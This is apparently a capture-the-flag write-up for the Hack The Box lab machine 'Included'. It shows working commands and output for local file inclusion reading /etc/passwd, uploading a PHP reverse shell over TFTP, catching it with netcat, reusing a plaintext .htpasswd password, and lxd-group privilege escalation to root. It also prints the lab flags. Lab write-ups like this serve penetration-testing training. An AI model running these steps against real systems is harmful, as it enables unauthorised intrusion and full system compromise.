# ENUMERATION

As alway, nmap:

```shell
└──╼ $nmap -sC -sV $SERVERIP -o enumeration/nmap.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 20:31 CEST
Nmap scan report for 10.129.95.185
Host is up (0.032s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.95.185/?file=home.php

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds
┌─[parrot]─[~/hackthebox/StartingPoint/Included]
└──╼ $

```
Let's navigate to port 80 using a browser, we can see that this has automatically changed to ```http://{target_IP}/?file=home.php```  This is a common way that developers use to dynamically load pages in a website and if not programmed correctly it can often lead to the webpage being vulnerable to LFI.

Lets try to change php "file" varialbe with curl:
```shell
──╼ $curl http://$SERVERIP/?file=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
┌─[parrot]─[~/hackthebox/StartingPoint/Included]
```

If function has no relative path and force with work directory like /var/www/html, we can do it the same changeing the path like this:
```curl http://$SERVERIP/?file=../../../etc/passwd```

We se tftp user on password file, lets check if services is running (UDP):

```shell
└──╼ $sudo nmap -p 69 -sU $SERVERIP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 21:57 CEST
Nmap scan report for 10.129.95.185
Host is up (0.034s latency).

PORT   STATE         SERVICE
69/udp open|filtered tftp

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
┌─[darthv@parrot]─[~/hackthebox/StartingPoint/Included]
└──╼ $

```

# Foothold

We will access to serve with LFI uploading ghough tftp. Lets serch on google php reverse shell, and downlad the following [script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php), replace ip and port vars on it.

```shell
└──╼ $wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2022-09-03 21:53:15--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5,4K) [text/plain]
Saving to: ‘php-reverse-shell.php’

php-reverse-shell.php   100%[=============================>]   5,36K  --.-KB/s    in 0s      

2022-09-03 21:53:15 (12,8 MB/s) - ‘php-reverse-shell.php’ saved [5491/5491]
```

Lets change ip var and upload shell.php file to server:
```shell
└──╼ $tftp $SERVERIP
tftp> put shell.php
Sent 5686 bytes in 0.4 seconds
tftp> quit
```

Open netcat on local computer:
```shell
└──╼ $nc -lvp 1234
listening on [any] 1234 ...
```

Lets curl shell.php on server:
```shell
└──╼ $curl http://$SERVERIP/?file=/var/lib/tftpboot/shell.php
```

Shell has been established on nc session:
```shell
└──╼ $nc -lvp 1234
listening on [any] 1234 ...
10.129.95.185: inverse host lookup failed: Unknown host
connect to [10.10.14.104] from (UNKNOWN) [10.129.95.185] 40236
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 20:03:31 up  1:47,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
``` 

Lets open a better shell:
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@included:/$ 
```

# Lateral Movement
With access to the system as the www-data user we do not have enough privileges to read the user flag, so we'll use mike user found on passwd file. Let's take a look on .htaccess and .htpasswd files:

```shell
www-data@included:/var/www/html$ cat .htaccess
cat .htaccess
RewriteEngine On
RewriteCond %{THE_REQUEST} ^GET.*index\.php [NC]
RewriteRule (.*?)index\.php/*(.*) /$1$2 [R=301,NE,L]
#<Files index.php>
#AuthType Basic
#AuthUserFile /var/www/html/.htpasswd
#Require valid-user
www-data@included:/var/www/html$ cat .htpasswd
cat .htpasswd
mike:Sheffield19
www-data@included:/var/www/html$ 

```

Lets jump to user mike:
```shell
www-data@included:/var/www/html$ su - mike
su - mike
Password: Sheffield19

mike@included:~$ id
id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
mike@included:~$ groups
groups
mike lxd
mike@included:~$ 
cat user.txt
a56ef91d70cfbf2cdb8f454c006935a1

```

We can see that mike belongs to lxd group, LXD is a management API for dealing with LXC containers on linux systems. It will perfom tasks for any members of the local lxd group. Searching LXD Exploit on Google reveals the following [information](https://www.hackingarticles.in/lxd-privilege-escalation/):

A member of the local "lxd" group can instantly escalate the privileges to root on the host operating system. [This](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) HackTricks page describes the whole explotation process step by step.

First lets install the following packages:
```shell
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
```

Then clone LXC Distribution Builder and build it:
```shell
└──╼ $sudo snap install distrobuilder --classic
2022-09-03T22:24:46+02:00 INFO Waiting for automatic snapd restart...
distrobuilder 2.1 from Stéphane Graber (stgraber) installed

sudo /snap/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```
Once the build is done lxd.tar.xz and rootlet.squashfs will be available in the same folder:
```shell
└──╼ $ls -lrt
total 2024
-rw-r--r-- 1 darthv darthv   15788 sep  3 22:26 alpine.yaml
-rw-r--r-- 1 root   root   2052096 sep  3 22:27 rootfs.squashfs
-rw-r--r-- 1 root   root       880 sep  3 22:27 lxd.tar.xz
┌─[parrot]─[~/ContainerImages/alpine]
└──╼ $
```

Transfer to server with the python http module:
```shell
└──╼ $python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Lets get on server from reverse shell session:
```shell
mike@included:~$ wget http://10.10.14.104:8000/lxd.tar.xz
wget http://10.10.14.104:8000/lxd.tar.xz
--2022-09-03 20:38:15--  http://10.10.14.104:8000/lxd.tar.xz
Connecting to 10.10.14.104:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 880 [application/x-xz]
Saving to: ‘lxd.tar.xz’

lxd.tar.xz          100%[===================>]     880  --.-KB/s    in 0s      

2022-09-03 20:38:15 (46.4 MB/s) - ‘lxd.tar.xz’ saved [880/880]

mike@included:~$ wget http://10.10.14.104:8000/rootfs.squashfs
wget http://10.10.14.104:8000/rootfs.squashfs
--2022-09-03 20:38:29--  http://10.10.14.104:8000/rootfs.squashfs
Connecting to 10.10.14.104:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2052096 (2.0M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs     100%[===================>]   1.96M  3.44MB/s    in 0.6s    

2022-09-03 20:38:30 (3.44 MB/s) - ‘rootfs.squashfs’ saved [2052096/2052096]

mike@included:~$ 
```

The next step is to import the image using LXC command-line tool:
```shell
mike@included:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
mike@included:~$ lxc image list
lxc image list
+--------+--------------+--------+----------------------------------------+--------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+----------------------------------------+--------+--------+-----------------------------+
| alpine | 437f36c6eedc | no     | Alpinelinux 3.8 x86_64 (20220903_2027) | x86_64 | 1.96MB | Sep 3, 2022 at 8:40pm (UTC) |
+--------+--------------+--------+----------------------------------------+--------+--------+-----------------------------+
mike@included:~$ 
```

Set security.privileged flat to true and mount root file system on /mnt folder:

```shell
mike@included:~$ lxc init alpine privsec -c security.privileged=true
lxc init alpine privsec -c security.privileged=true
Creating privsec
mike@included:~$ lxc config device add privsec host-root disk source=/ path=/mnt/root recursive=true
<st-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privsec
mike@included:~$ 

```
Finally we can start the container and start a root shell inside it.
```shell
mike@included:~$ lxc init alpine privsec -c security.privileged=true
lxc init alpine privsec -c security.privileged=true
Creating privsec
mike@included:~$ lxc config device add privsec host-root disk source=/ path=/mnt/root recursive=true
<st-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privsec
mike@included:~$ lxc start privesc
lxc start privesc
Error: not found
mike@included:~$ lxc start privesc
lxc start privesc
Error: not found
mike@included:~$ lxc start privsec
lxc start privsec
mike@included:~$ lxc exec privsec /bin/sh
lxc exec privsec /bin/sh

~ # ^[[41;5Rid
id
uid=0(root) gid=0(root)
~ # ^[[41;5R
cd /mnt/root/root
/mnt/root/root # ^[[41;18Rcat root.txt
cat root.txt
c693d9c7499d9f572ee375d4c14c7bcf
/mnt/root/root # ^[[41;18R

```


